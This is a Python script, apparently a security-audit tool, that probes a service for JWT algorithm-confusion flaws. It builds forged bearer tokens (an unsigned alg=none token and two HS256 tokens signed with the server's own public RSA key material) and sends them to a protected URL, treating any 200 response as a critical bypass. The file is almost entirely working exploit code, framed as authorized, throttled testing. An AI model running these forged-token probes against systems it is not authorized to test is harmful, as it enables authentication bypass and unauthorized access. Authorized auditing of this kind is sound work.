#!/usr/bin/env python3
"""JWT algorithm-confusion probe for CDC audits.

Usage: python3 jwt_confusion_probe.py <jwks_url> <protected_url> [issuer]

For each of: (1) alg=none, (2) HS256 with JWK-JSON as HMAC secret,
(3) HS256 with raw RSA modulus as HMAC secret — sends a forged token to the
protected URL and prints the status code.

Interpretation:
  - All 401/403  => algorithm pinned, confusion ruled out for THIS issuer (record as verified negative).
  - Any 200      => CRITICAL: forge tokens at will; escalate immediately.
  - Error bodies that differ between the three probes => validation oracle, note it.

Run once per accepted issuer (check metrics/labels for issuer lists). Also probe the
second-issuer path even when the first is pinned; aud-binding gaps are separate from alg pinning.

Authorized-use only. Sends ≤4 throttled GET requests.
"""
import json, base64, hmac, hashlib, sys, time
import urllib.request, urllib.error

def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

def send(url: str, token: str) -> str:
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + token})
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return f'{r.status} {r.read()[:200]!r}'
    except urllib.error.HTTPError as e:
        return f'{e.code} {e.read()[:120]!r}'
    except Exception as e:
        return f'ERROR {e}'

def main() -> None:
    jwks_url, protected_url = sys.argv[1], sys.argv[2]
    issuer = sys.argv[3] if len(sys.argv) > 3 else 'identity-service'

    jwks = json.load(urllib.request.urlopen(jwks_url, timeout=15))
    key = jwks['keys'][0]
    print(f'[*] JWKS kid={key.get("kid")} alg={key.get("alg")} kty={key.get("kty")}')

    payload = b64u(json.dumps({'sub': 'probe', 'iss': issuer,
                               'exp': int(time.time()) + 3600}).encode())

    # 1) alg=none
    none_tok = b64u(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()) + '.' + payload + '.'
    print('[alg=none]      ->', send(protected_url, none_tok))
    time.sleep(1)

    # 2-3) HS256 confusion, two common key-material forms
    header = b64u(json.dumps({'alg': 'HS256', 'typ': 'JWT',
                              'kid': key.get('kid')}).encode())
    msg = (header + '.' + payload).encode()
    materials = {
        'HS256 jwk-json': json.dumps(key).encode(),
        'HS256 raw-n': base64.urlsafe_b64decode(key['n'] + '=' * (-len(key['n']) % 4)),
    }
    for name, km in materials.items():
        sig = b64u(hmac.new(km, msg, hashlib.sha256).digest())
        print(f'[{name}] ->', send(protected_url, header + '.' + payload + '.' + sig))
        time.sleep(1)

if __name__ == '__main__':
    main()
